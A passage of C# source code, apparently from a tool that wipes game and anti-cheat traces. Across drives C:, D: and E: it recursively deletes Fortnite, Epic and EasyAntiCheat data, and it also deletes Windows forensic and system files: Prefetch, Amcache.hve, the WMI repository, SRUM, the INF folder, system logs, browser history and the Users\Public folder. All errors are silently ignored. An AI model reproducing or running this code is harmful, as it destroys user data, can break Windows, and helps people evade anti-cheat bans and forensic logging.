                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngine", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }
            }
            if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngineLauncher"))
            {
                try
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngineLauncher", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }
            }
            if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher"))
            {
                try
                {

                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }
            }
            if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame"))
            {
                try
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }

            }
            try
            {
                if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\NVIDIA Corporation"))
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\NVIDIA Corporation", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\Speech Graphics"))
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Speech Graphics", true);
                }
            }
            catch
            {
            }

            if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\Packages"))
            {
                try
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Packages", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }

            }
            try
            {
                if (File.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\AMD\\DxCache"))
                {
                    File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\AMD\\DxCache");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk"))
                {
                    File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache"))
                {
                    File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache");
                }
            }
            catch
            {
            }

            if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent"))
            {
                try
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }

            }
            if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\Notifications"))
            {
                try
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\Notifications", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }

            }
            try
            {


                if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache"))
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Roaming\\EasyAntiCheat"))
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Roaming\\EasyAntiCheat", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore"))
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds"))
                {
                    File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\Program Files\\Epic Games\\Fortnite.lysEB"))
                {
                    File.Delete("C:\\Program Files\\Epic Games\\Fortnite.lysEB");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir"))
                {
                    Directory.Delete("C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591"))
                {
                    File.Delete("C:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local"))
                {
                    File.Delete("C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current"))
                {
                    File.Delete("C:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat"))
                {
                    File.Delete("C:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("C:\\MSOCache"))
                {
                    Directory.Delete("C:\\MSOCache", true);
                }
            }
            catch
            {
            }
            try
            {

                if (File.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav"))
                {
                    File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav");
                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp");
                }
            }
            catch
            {
            }


            try
            {
                {
                    File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp\\1CF5.bat");

                }
            }
            catch
            {
            }
            try
            {


                {
                    File.Delete("C:Windows\\System32\\spp\\store\\2.0\\data.dat");

                }
            }
            catch
            {
            }



            try
            {

                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache\\", true);

            }
            catch
            {

            }


            try
            {
                {
                    Directory.Delete("C:\\Users\\Public", true);

                }
            }
            catch
            {
            }
            try
            {
                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngine", true);

            }
            catch
            {
            }
            try
            {
                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher", true);

            }
            catch
            {
            }
            try
            {
                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame", true);

            }
            catch
            {
            }
            try
            {
                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds", true);

            }
            catch
            {
            }
            try
            {
                File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds");
            }
            catch
            {
            }
            try
            {
                File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\OneDrive\\settings\\Personal\\logUploaderSettings_temp.ini");
            }
            catch
            {
            }
            try
            {
                File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\OneDrive\\settings\\Personal\\logUploaderSettings.ini");
            }
            catch
            {
            }
            try
            {
                File.Delete("C:\\desktop.ini");

            }
            catch
            {
            }
            try
            {
                File.Delete("C:\\ProgramData\\Microsoft\\Diagnosis\\parse.dat");

            }
            catch
            {
            }
            try
            {
                File.Delete("C:\\Users\\" + Username + "\\ntuser.dat.LOG2");

            }
            catch
            {
            }
            try
            {

                File.Delete("C:\\Users\\" + Username + "\\ntuser.dat.LOG1");

            }
            catch
            {
            }

            try
            {


                {
                    File.Delete("C:\\Users\\" + Username + "\\ntuser.dat.LOG1");

                }
            }
            catch
            {
            }
            try
            {



                File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\Settings\\settings.dat.LOG2");


            }
            catch
            {
            }

            string[] List = Directory.GetFiles("C:\\Users", @"desktop.ini");
            foreach (string files in List)
            {
                File.Delete(files);
            }
            try
            {



                File.Delete("C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Windows\\qwavecache.dat");


            }
            catch
            {
            }
            try
            {



                File.Delete("C:\\Windows\\System32\\wbem\\Performance\\WmiApRpl.ini");


            }
            catch
            {
            }
            try
            {



                File.Delete("C:\\Windows\\System32\\PerfStringBackup.TMP");


            }
            catch
            {
            }
            try
            {



                File.Delete("C:\\Windows\\System32\\PerfStringBackup.INI");


            }
            catch
            {
            }
            try
            {



                File.Delete("C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA");


            }
            catch
            {
            }
            try
            {



                File.Delete("C:\\Windows\\System32\\wbem\\Repository\\INDEX.BTR");


            }
            catch
            {
            }
            try
            {



                File.Delete("C:\\Windows\\System32\\wbem\\Repository\\MAPPING2.MAP");


            }
            catch
            {
            }

            try
            {



                Directory.Delete("C:\\Windows\\Prefetch", true);


            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("C:\\Windows\\temp\\MpCmdRun.log", true);

                }
            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Windows\\Prefetch", true);



            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Windows\\System32\\sru", true);


            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir", true);


            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC", true);


            }
            catch
            {
            }
            try
            {



                File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC");


            }
            catch
            {
            }

            try
            {



                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5", true);


            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache", true);


            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache", true);


            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache", true);


            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCookies", true);


            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\remotemetastore", true);


            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore", true);

            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Windows\\INF", true);

            }
            catch
            {
            }
            try
            {



                File.Delete("C:\\Windows\\INF");

            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\NVIDIA Corporation", true);

            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("C:\\Windows\\Logs\\CBS", true);
                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("C:\\Windows\\Logs", true);
                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("C:\\Windows\\SoftwareDistribution\\DataStore\\Logs", true);
                }
            }
            catch
            {
            }

            try
            {
                if (File.Exists("D:\\Windows\\System32\\eac_usermode_21537346703536.dll"))
                {
                    File.Delete("D:\\Windows\\System32\\eac_usermode_21537346703536.dll");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("D:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive"))
                {
                    Directory.Delete("D:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\Windows\\appcompact\\Programs\\Amcache.hve"))
                {
                    File.Delete("D:\\Windows\\appcompact\\Programs\\Amcache.hve");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl"))
                {
                    File.Delete("D:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\Windows\\System\\config\\BBI.LOG2"))
                {
                    File.Delete("D:\\Windows\\System\\config\\BBI.LOG2");
                }
            }
            catch
            {
            }

            if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngine"))
            {
                try
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngine", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }
            }
            if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngineLauncher"))
            {
                try
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngineLauncher", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }
            }
            if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher"))
            {
                try
                {

                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }
            }
            if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame"))
            {
                try
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }

            }
            try
            {
                if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\NVIDIA Corporation"))
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\NVIDIA Corporation", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\Speech Graphics"))
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Speech Graphics", true);
                }
            }
            catch
            {
            }

            if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\Packages"))
            {
                try
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Packages", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }

            }
            try
            {
                if (File.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\AMD\\DxCache"))
                {
                    File.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\AMD\\DxCache");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk"))
                {
                    File.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache"))
                {
                    File.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache");
                }
            }
            catch
            {
            }

            if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent"))
            {
                try
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }

            }
            if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\Notifications"))
            {
                try
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\Notifications", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }

            }
            try
            {


                if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache"))
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Roaming\\EasyAntiCheat"))
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Roaming\\EasyAntiCheat", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore"))
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds"))
                {
                    File.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\Program Files\\Epic Games\\Fortnite.lysEB"))
                {
                    File.Delete("D:\\Program Files\\Epic Games\\Fortnite.lysEB");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir"))
                {
                    Directory.Delete("D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591"))
                {
                    File.Delete("D:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local"))
                {
                    File.Delete("D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current"))
                {
                    File.Delete("D:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat"))
                {
                    File.Delete("D:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("D:\\MSOCache"))
                {
                    Directory.Delete("D:\\MSOCache", true);
                }
            }
            catch
            {
            }
            try
            {

                if (File.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav"))
                {
                    File.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav");
                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp");
                }
            }
            catch
            {
            }





            try
            {
                {
                    File.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp\\1CF5.bat");

                }
            }
            catch
            {
            }
            try
            {


                {
                    File.Delete("C:Windows\\System32\\spp\\store\\2.0\\data.dat");

                }
            }
            catch
            {
            }



            try
            {


                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache\\", true);

                }
            }
            catch
            {

            }









            try
            {
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Origin", true);

                }
            }
            catch
            {
            }
            try
            {

                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Origin", true);

                }
            }
            catch
            {
            }


            try
            {
                {
                    Directory.Delete("D:\\Users\\Public", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds");

                }
            }
            catch
            {
            }
            try
            {


                {
                    File.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF244a582.TMP");

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("D:\\Windows\\temp\\w1053", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("D:\\Windows\\temp\\MpCmdRun.log", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("D:\\Windows\\Prefetch", true);

                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Windows\\System32\\eac_usermode_21537346703536.dll"))
                {
                    File.Delete("E:\\Windows\\System32\\eac_usermode_21537346703536.dll");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("E:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive"))
                {
                    Directory.Delete("E:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Windows\\appcompact\\Programs\\Amcache.hve"))
                {
                    File.Delete("E:\\Windows\\appcompact\\Programs\\Amcache.hve");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl"))
                {
                    File.Delete("E:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Windows\\System\\config\\BBI.LOG2"))
                {
                    File.Delete("E:\\Windows\\System\\config\\BBI.LOG2");
                }
            }
            catch
            {
            }

            if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngine"))
            {
                try
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngine", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }
            }
            if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngineLauncher"))
            {
                try
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngineLauncher", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }
            }
            if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher"))
            {
                try
                {

                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }
            }
            if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame"))
            {
                try
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }

            }
            try
            {
                if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\NVIDIA Corporation"))
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\NVIDIA Corporation", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\Speech Graphics"))
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Speech Graphics", true);
                }
            }
            catch
            {
            }

            if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\Packages"))
            {
                try
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Packages", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }

            }
            try
            {
                if (File.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\AMD\\DxCache"))
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\AMD\\DxCache");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk"))
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache"))
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache");
                }
            }
            catch
            {
            }

            if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent"))
            {
                try
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }

            }
            if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\Notifications"))
            {
                try
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\Notifications", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }

            }
            try
            {


                if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache"))
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Roaming\\EasyAntiCheat"))
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Roaming\\EasyAntiCheat", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore"))
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds"))
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Program Files\\Epic Games\\Fortnite.lysEB"))
                {
                    File.Delete("E:\\Program Files\\Epic Games\\Fortnite.lysEB");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir"))
                {
                    Directory.Delete("E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591"))
                {
                    File.Delete("E:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local"))
                {
                    File.Delete("E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current"))
                {
                    File.Delete("E:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat"))
                {
                    File.Delete("E:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("E:\\MSOCache"))
                {
                    Directory.Delete("E:\\MSOCache", true);
                }
            }
            catch
            {
            }
            try
            {

                if (File.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav"))
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav");
                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp");
                }
            }
            catch
            {
            }
            try
            {

                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network Persistent State~RF245551b.TMP");

                }
            }
            catch
            {
            }
            try
            {
                {
